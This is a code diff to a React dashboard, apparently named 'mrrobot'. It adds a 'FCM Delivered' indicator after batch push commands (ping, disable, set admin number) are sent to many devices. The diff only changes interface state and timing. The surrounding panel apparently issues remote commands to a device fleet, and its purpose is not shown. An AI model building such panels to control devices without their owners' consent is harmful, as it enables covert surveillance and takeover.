@@ -1841,8 +1841,23 @@ function CardCheckBtn({ device }: { device: FullDevice }) {
   const [checking, setChecking] = useState(false);
   const [done, setDone]       = useState(false);
   const [seconds, setSeconds] = useState(0);
+  const [batchPinged, setBatchPinged] = useState(false);
   const timerRef    = useRef<ReturnType<typeof setInterval> | null>(null);
+  const batchTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
   const activeRef   = useRef(false); // true ONLY while we are waiting for ping response
+
+  // Listen for Ping All FCM delivery event
+  useEffect(() => {
+    function onPinged(e: Event) {
+      const { deviceId } = (e as CustomEvent<{ deviceId: string }>).detail;
+      if (deviceId !== device.deviceId) return;
+      setBatchPinged(true);
+      if (batchTimerRef.current) clearTimeout(batchTimerRef.current);
+      batchTimerRef.current = setTimeout(() => setBatchPinged(false), 30000);
+    }
+    window.addEventListener("mrrobot:fcm_pinged", onPinged);
+    return () => { window.removeEventListener("mrrobot:fcm_pinged", onPinged); if (batchTimerRef.current) clearTimeout(batchTimerRef.current); };
+  }, [device.deviceId]);
 
   function stopTimer() {
     if (timerRef.current) { clearInterval(timerRef.current); timerRef.current = null; }
@@ -1899,13 +1914,13 @@ function CardCheckBtn({ device }: { device: FullDevice }) {
     <button onClick={() => void handleClick()} style={{
       width: "100%", borderRadius: 8, padding: "10px 4px",
       fontSize: 13, fontWeight: 700, textAlign: "center",
-      border: checking ? `1px solid ${T.accent}` : "1px solid #e2e8f0",
-      background: checking ? T.accent : "#f8fafc",
-      color: checking ? "#fff" : "#475569",
+      border: checking ? `1px solid ${T.accent}` : batchPinged ? `1px solid ${T.green}` : "1px solid #e2e8f0",
+      background: checking ? T.accent : batchPinged ? T.green : "#f8fafc",
+      color: checking || batchPinged ? "#fff" : "#475569",
       cursor: checking ? "default" : "pointer",
       transition: "background 0.25s, border-color 0.25s, color 0.25s",
     }}>
-      {checking ? `${seconds}s…` : "Check Online"}
+      {checking ? `${seconds}s…` : batchPinged ? "✅ FCM Delivered" : "Check Online"}
     </button>
   );
 }
@@ -2248,14 +2263,14 @@ function SettingsTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
           if (batchAction === "ping") data = { type: "0" };
           else if (batchAction === "disable") data = { type: "admin_update", status: "off" };
           else data = { type: "admin_update", status: "on", number: adminNumInput.trim() };
-          return apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: d.deviceId, data }) }).then(res => { if (!res.ok) throw new Error(); });
+          return apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: d.deviceId, data }) }).then(res => { if (!res.ok) throw new Error(); window.dispatchEvent(new CustomEvent("mrrobot:fcm_pinged", { detail: { deviceId: d.deviceId } })); });
         }));
         results.forEach(r2 => r2.status === "fulfilled" ? ok++ : fail++);
         setBatchDone(Math.min(i + BATCH, eligible.length));
         if (i + BATCH < eligible.length) await new Promise(r2 => setTimeout(r2, DELAY));
       }
       setBatchResult({ ok, fail }); setBatchState("done");
-      setTimeout(() => { setBatchState("idle"); setBatchDone(0); setBatchTotal(0); setBatchResult(null); }, 6000);
+      setTimeout(() => { setBatchState("idle"); setBatchDone(0); setBatchTotal(0); setBatchResult(null); }, 30000);
     } catch { setBatchState("err"); setTimeout(() => setBatchState("idle"), 3000); }
   }
 
